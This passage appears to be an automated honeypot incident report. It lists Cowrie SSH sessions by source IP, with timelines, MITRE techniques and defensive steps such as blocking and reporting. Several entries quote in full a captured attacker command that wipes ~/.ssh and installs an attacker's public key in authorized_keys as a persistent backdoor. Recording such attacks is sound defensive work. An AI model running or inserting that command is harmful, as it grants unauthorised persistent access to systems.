| `2026-07-01 09:00:36` | `cowrie.login.success` |
| `2026-07-01 09:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.227[.]158` to AbuseIPDB if not already reported
- [ ] Block `165.154.227[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f539c08d658f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 09:02 |
| **Last Seen** | 2026-07-01 09:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:02:09` | `cowrie.session.connect` |
| `2026-07-01 09:02:09` | `cowrie.client.version` |
| `2026-07-01 09:02:09` | `cowrie.client.kex` |
| `2026-07-01 09:02:12` | `cowrie.login.success` |
| `2026-07-01 09:02:13` | `cowrie.session.params` |
| `2026-07-01 09:02:13` | `cowrie.command.input` |
| `2026-07-01 09:02:14` | `cowrie.log.closed` |
| `2026-07-01 09:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c8973732d2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 09:06 |
| **Last Seen** | 2026-07-01 09:06 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:06:15` | `cowrie.session.connect` |
| `2026-07-01 09:06:16` | `cowrie.client.version` |
| `2026-07-01 09:06:16` | `cowrie.client.kex` |
| `2026-07-01 09:06:23` | `cowrie.login.success` |
| `2026-07-01 09:06:26` | `cowrie.session.params` |
| `2026-07-01 09:06:26` | `cowrie.command.input` |
| `2026-07-01 09:06:27` | `cowrie.log.closed` |
| `2026-07-01 09:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c9d945f076d

| Field | Detail |
|---|---|
| **Source IP** | `61.28.144[.]154` |
| **First Seen** | 2026-07-01 09:17 |
| **Last Seen** | 2026-07-01 09:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:17:04` | `cowrie.session.connect` |
| `2026-07-01 09:17:04` | `cowrie.client.version` |
| `2026-07-01 09:17:04` | `cowrie.client.kex` |
| `2026-07-01 09:17:05` | `cowrie.login.success` |
| `2026-07-01 09:17:06` | `cowrie.session.params` |
| `2026-07-01 09:17:06` | `cowrie.command.input` |
| `2026-07-01 09:17:06` | `cowrie.command.failed` |
| `2026-07-01 09:17:07` | `cowrie.log.closed` |
| `2026-07-01 09:17:07` | `cowrie.session.params` |
| `2026-07-01 09:17:07` | `cowrie.command.input` |
| `2026-07-01 09:17:08` | `cowrie.session.file_download` |
| `2026-07-01 09:17:08` | `cowrie.log.closed` |
| `2026-07-01 09:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.28.144[.]154` to AbuseIPDB if not already reported
- [ ] Block `61.28.144[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f0c424bf84

| Field | Detail |
|---|---|
| **Source IP** | `61.28.144[.]154` |
| **First Seen** | 2026-07-01 09:17 |
| **Last Seen** | 2026-07-01 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:17:08` | `cowrie.session.connect` |
| `2026-07-01 09:17:08` | `cowrie.client.version` |
| `2026-07-01 09:17:08` | `cowrie.client.kex` |
| `2026-07-01 09:17:09` | `cowrie.login.success` |
| `2026-07-01 09:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.28.144[.]154` to AbuseIPDB if not already reported
- [ ] Block `61.28.144[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75e78628f9f6

| Field | Detail |
|---|---|
| **Source IP** | `61.28.144[.]154` |
| **First Seen** | 2026-07-01 09:17 |
| **Last Seen** | 2026-07-01 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:17:10` | `cowrie.session.connect` |
| `2026-07-01 09:17:10` | `cowrie.client.version` |
| `2026-07-01 09:17:10` | `cowrie.client.kex` |
| `2026-07-01 09:17:11` | `cowrie.login.success` |
| `2026-07-01 09:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.28.144[.]154` to AbuseIPDB if not already reported
- [ ] Block `61.28.144[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463a2a6d225d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 09:17 |
| **Last Seen** | 2026-07-01 09:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:17:47` | `cowrie.session.connect` |
| `2026-07-01 09:17:49` | `cowrie.client.version` |
| `2026-07-01 09:17:49` | `cowrie.client.kex` |
| `2026-07-01 09:17:54` | `cowrie.login.success` |
| `2026-07-01 09:17:59` | `cowrie.session.params` |
| `2026-07-01 09:17:59` | `cowrie.command.input` |
| `2026-07-01 09:18:00` | `cowrie.log.closed` |
| `2026-07-01 09:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afdb24ae057b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 09:18 |
| **Last Seen** | 2026-07-01 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:18:56` | `cowrie.session.connect` |
| `2026-07-01 09:18:56` | `cowrie.client.version` |
| `2026-07-01 09:18:56` | `cowrie.client.kex` |
| `2026-07-01 09:18:58` | `cowrie.login.success` |
| `2026-07-01 09:19:00` | `cowrie.session.params` |
| `2026-07-01 09:19:00` | `cowrie.command.input` |
| `2026-07-01 09:19:00` | `cowrie.log.closed` |
| `2026-07-01 09:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85f52af1802f

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-07-01 09:20 |
| **Last Seen** | 2026-07-01 09:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:20:09` | `cowrie.session.connect` |
| `2026-07-01 09:20:09` | `cowrie.client.version` |
| `2026-07-01 09:20:09` | `cowrie.client.kex` |
| `2026-07-01 09:20:10` | `cowrie.login.success` |
| `2026-07-01 09:20:11` | `cowrie.session.params` |
| `2026-07-01 09:20:11` | `cowrie.command.input` |
| `2026-07-01 09:20:11` | `cowrie.command.failed` |
| `2026-07-01 09:20:11` | `cowrie.log.closed` |
| `2026-07-01 09:20:12` | `cowrie.session.params` |
| `2026-07-01 09:20:12` | `cowrie.command.input` |
| `2026-07-01 09:20:13` | `cowrie.session.file_download` |
| `2026-07-01 09:20:13` | `cowrie.log.closed` |
| `2026-07-01 09:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8890113f8f1b

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-07-01 09:20 |
| **Last Seen** | 2026-07-01 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:20:13` | `cowrie.session.connect` |
| `2026-07-01 09:20:13` | `cowrie.client.version` |
| `2026-07-01 09:20:13` | `cowrie.client.kex` |
| `2026-07-01 09:20:14` | `cowrie.login.success` |
| `2026-07-01 09:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf1d77e7a06

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-07-01 09:20 |
| **Last Seen** | 2026-07-01 09:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:20:14` | `cowrie.session.connect` |
| `2026-07-01 09:20:14` | `cowrie.client.version` |
| `2026-07-01 09:20:15` | `cowrie.client.kex` |
| `2026-07-01 09:20:16` | `cowrie.login.success` |
| `2026-07-01 09:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105233f3abb7

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-07-01 09:24 |
| **Last Seen** | 2026-07-01 09:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:24:00` | `cowrie.session.connect` |
| `2026-07-01 09:24:00` | `cowrie.client.version` |
| `2026-07-01 09:24:00` | `cowrie.client.kex` |
| `2026-07-01 09:24:00` | `cowrie.login.success` |
| `2026-07-01 09:24:01` | `cowrie.session.params` |
| `2026-07-01 09:24:01` | `cowrie.command.input` |
| `2026-07-01 09:24:01` | `cowrie.command.failed` |
| `2026-07-01 09:24:02` | `cowrie.log.closed` |
| `2026-07-01 09:24:02` | `cowrie.session.params` |
| `2026-07-01 09:24:02` | `cowrie.command.input` |
| `2026-07-01 09:24:03` | `cowrie.session.file_download` |
| `2026-07-01 09:24:03` | `cowrie.log.closed` |
| `2026-07-01 09:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01fa0e83f29e

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-07-01 09:24 |
| **Last Seen** | 2026-07-01 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:24:03` | `cowrie.session.connect` |
| `2026-07-01 09:24:03` | `cowrie.client.version` |
| `2026-07-01 09:24:03` | `cowrie.client.kex` |
| `2026-07-01 09:24:04` | `cowrie.login.success` |
| `2026-07-01 09:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e207432735

| Field | Detail |
|---|---|
| **Source IP** | `190.128.201[.]18` |
| **First Seen** | 2026-07-01 09:24 |
| **Last Seen** | 2026-07-01 09:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:24:04` | `cowrie.session.connect` |
| `2026-07-01 09:24:04` | `cowrie.client.version` |
| `2026-07-01 09:24:04` | `cowrie.client.kex` |
| `2026-07-01 09:24:05` | `cowrie.login.success` |
| `2026-07-01 09:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.128.201[.]18` to AbuseIPDB if not already reported
- [ ] Block `190.128.201[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f045b8b37051

| Field | Detail |
|---|---|
| **Source IP** | `111.228.36[.]44` |
| **First Seen** | 2026-07-01 09:24 |
| **Last Seen** | 2026-07-01 09:29 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:24:08` | `cowrie.session.connect` |
| `2026-07-01 09:24:10` | `cowrie.client.version` |
| `2026-07-01 09:24:10` | `cowrie.client.kex` |
| `2026-07-01 09:24:11` | `cowrie.login.success` |
| `2026-07-01 09:24:12` | `cowrie.session.params` |
| `2026-07-01 09:24:12` | `cowrie.command.input` |
| `2026-07-01 09:24:12` | `cowrie.command.failed` |
| `2026-07-01 09:24:12` | `cowrie.log.closed` |
| `2026-07-01 09:24:13` | `cowrie.session.params` |
| `2026-07-01 09:24:13` | `cowrie.command.input` |
| `2026-07-01 09:24:13` | `cowrie.session.file_download` |
| `2026-07-01 09:24:13` | `cowrie.log.closed` |
| `2026-07-01 09:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.36[.]44` to AbuseIPDB if not already reported
- [ ] Block `111.228.36[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-560e763a8888

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 09:29 |
| **Last Seen** | 2026-07-01 09:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:29:11` | `cowrie.session.connect` |
| `2026-07-01 09:29:12` | `cowrie.client.version` |
| `2026-07-01 09:29:12` | `cowrie.client.kex` |
| `2026-07-01 09:29:19` | `cowrie.login.success` |
| `2026-07-01 09:29:22` | `cowrie.session.params` |
| `2026-07-01 09:29:22` | `cowrie.command.input` |
| `2026-07-01 09:29:24` | `cowrie.log.closed` |
| `2026-07-01 09:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77b05c4c939e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 09:35 |
| **Last Seen** | 2026-07-01 09:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:35:38` | `cowrie.session.connect` |
| `2026-07-01 09:35:39` | `cowrie.client.version` |
| `2026-07-01 09:35:39` | `cowrie.client.kex` |
| `2026-07-01 09:35:41` | `cowrie.login.success` |
| `2026-07-01 09:35:44` | `cowrie.session.params` |
| `2026-07-01 09:35:44` | `cowrie.command.input` |
| `2026-07-01 09:35:44` | `cowrie.log.closed` |
| `2026-07-01 09:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e836fddf520

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 09:40 |
| **Last Seen** | 2026-07-01 09:40 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:40:39` | `cowrie.session.connect` |
| `2026-07-01 09:40:41` | `cowrie.client.version` |
| `2026-07-01 09:40:41` | `cowrie.client.kex` |
| `2026-07-01 09:40:47` | `cowrie.login.success` |
| `2026-07-01 09:40:50` | `cowrie.session.params` |
| `2026-07-01 09:40:50` | `cowrie.command.input` |
| `2026-07-01 09:40:51` | `cowrie.log.closed` |
| `2026-07-01 09:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0f53336004

| Field | Detail |
|---|---|
| **Source IP** | `150.241.77[.]28` |
| **First Seen** | 2026-07-01 09:42 |
| **Last Seen** | 2026-07-01 09:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:42:37` | `cowrie.session.connect` |
| `2026-07-01 09:42:37` | `cowrie.client.version` |
| `2026-07-01 09:42:37` | `cowrie.client.kex` |
| `2026-07-01 09:42:38` | `cowrie.login.success` |
| `2026-07-01 09:42:39` | `cowrie.session.params` |
| `2026-07-01 09:42:39` | `cowrie.command.input` |
| `2026-07-01 09:42:39` | `cowrie.command.failed` |
| `2026-07-01 09:42:39` | `cowrie.log.closed` |
| `2026-07-01 09:42:40` | `cowrie.session.params` |
| `2026-07-01 09:42:40` | `cowrie.command.input` |
| `2026-07-01 09:42:40` | `cowrie.session.file_download` |
| `2026-07-01 09:42:40` | `cowrie.log.closed` |
| `2026-07-01 09:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.241.77[.]28` to AbuseIPDB if not already reported
- [ ] Block `150.241.77[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5553cc26712b

| Field | Detail |
|---|---|
| **Source IP** | `150.241.77[.]28` |
| **First Seen** | 2026-07-01 09:42 |
| **Last Seen** | 2026-07-01 09:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:42:40` | `cowrie.session.connect` |
| `2026-07-01 09:42:40` | `cowrie.client.version` |
| `2026-07-01 09:42:40` | `cowrie.client.kex` |
| `2026-07-01 09:42:41` | `cowrie.login.success` |
| `2026-07-01 09:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.241.77[.]28` to AbuseIPDB if not already reported
- [ ] Block `150.241.77[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd74b8dc42a8

| Field | Detail |
|---|---|
| **Source IP** | `150.241.77[.]28` |
| **First Seen** | 2026-07-01 09:42 |
| **Last Seen** | 2026-07-01 09:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 09:42:41` | `cowrie.session.connect` |
| `2026-07-01 09:42:41` | `cowrie.client.version` |
| `2026-07-01 09:42:41` | `cowrie.client.kex` |
| `2026-07-01 09:42:41` | `cowrie.login.success` |
| `2026-07-01 09:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.241.77[.]28` to AbuseIPDB if not already reported
- [ ] Block `150.241.77[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83964084581a

| Field | Detail |
|---|---|
| **Source IP** | `203.185.198[.]246` |
| **First Seen** | 2026-07-01 09:48 |
| **Last Seen** | 2026-07-01 09:48 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
